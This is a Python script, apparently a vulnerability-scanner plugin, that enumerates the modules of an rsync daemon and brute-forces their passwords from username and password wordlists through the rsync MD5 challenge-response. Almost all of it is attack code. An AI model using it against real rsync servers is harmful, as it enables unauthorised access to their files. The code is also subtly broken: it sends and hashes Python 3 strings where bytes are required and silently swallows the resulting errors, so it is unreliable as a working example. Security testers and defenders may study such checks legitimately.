#!/usr/bin/env python3
'''
name: Rsync 弱口令访问漏洞
description: Rsync 弱口令漏洞
'''

import re
import time
import socket
import hashlib
from itertools import product
from base64 import b64encode
from urllib.parse import urlparse



class Rsync_Weakpwd_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.timeout = 10
        url_parse = urlparse(self.url)
        self.host = url_parse.hostname
        self.port = url_parse.port
        if not self.port:
            self.port = '80'
        self.sock = None


    def _rsync_init(self):
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        socket.setdefaulttimeout(self.timeout)
        sock.connect((self.host, int(self.port)))
        sock.send(b'@RSYNCD: 31\n')
        res = sock.recv(1024)
        self.sock = sock
        return res


    def is_path_not_auth(self, path_name = ''):
        self._rsync_init()
        payload = path_name + '\n'
        self.sock.send(payload.encode('utf-8'))
        result = self.sock.recv(1024).decode('utf-8')
        if result == '\n':
            result = self.sock.recv(1024)
        if result.startswith('@RSYNCD: OK'):
            return 0
        if result.startswith('@RSYNCD: AUTHREQD'):
            return 1
        if '@ERROR: chdir failed' in result:
            return -1
        else:
            return -1


    def get_all_pathname(self):
        path_name_list = []
        self._rsync_init()
        self.sock.send(b'\n')
        time.sleep(0.5)
        result = self.sock.recv(1024).decode('utf-8')
        if result:
            for path_name in re.split('\n', result):
                if path_name and not path_name.startswith('@RSYNCD: '):
                    path_name_list.append(path_name.split('\t')[0].strip())

        return path_name_list

    def weak_passwd_check(self, path_name='', username='', passwd=''):
        ver_string = self._rsync_init()
        if self._get_ver_num(ver_string=ver_string) < 30:
            print('Error info:', ver_string)
        payload = path_name + '\n'
        self.sock.send(payload)
        result = self.sock.recv(1024)
        if result == '\n':
            result = self.sock.recv(1024)
        if result:
            hash_o = hashlib.md5()
            hash_o.update(passwd)
            hash_o.update(result[18:].rstrip('\n'))
            auth_string = b64encode(hash_o.digest())
            send_data = username + ' ' + auth_string.rstrip('==') + '\n'
            self.sock.send(send_data)
            res = self.sock.recv(1024)
            if res.startswith('@RSYNCD: OK'):
                return (True, username, passwd)
            else:
                return False


    def _get_ver_num(self, ver_string=''):
        ver_num_com = re.compile('@RSYNCD: (\d+)')
        if ver_string:
            ver_num = ver_num_com.match(ver_string).group(1)
            if ver_num.isdigit():
                return int(ver_num)
            else: return 0
        else:
            return 0


    def run(self):
        flag = 0
        info = ''
        weak_auth_list = []
        try:
            for path_name in self.get_all_pathname():
                ret = self.is_path_not_auth(path_name)
                if ret == 1:
                    try:
                        for user in open('app/username.txt', 'r', encoding = 'utf-8').readlines():
                            user = user.strip()
                            for pwd in open('app/password.txt', 'r', encoding = 'utf-8').readlines():
                                if pwd != '':
                                    pwd = pwd.strip()
                                res = self.weak_passwd_check(path_name, user, pwd)
                                if res:
                                    flag = 1
                                    weak_auth_list.append((path_name, user, pwd))
                    except Exception as e:
                        pass
        except Exception as e:
            print(e)
            print('不存在Rsync目录弱口令漏洞')
            return False
        finally:
            pass

        if flag == 1:
            print('存在Rsync目录弱口令漏洞')
            for weak_auth in weak_auth_list:
                info += u'目录%s存在弱验证:%s:%s;' %weak_auth
            return True
        else:
            print('不存在Rsync目录弱口令漏洞')
            return False

if __name__ == '__main__':
    Rsync_Weakpwd = Rsync_Weakpwd_BaseVerify('http://127.0.0.1:873')
    Rsync_Weakpwd.run()
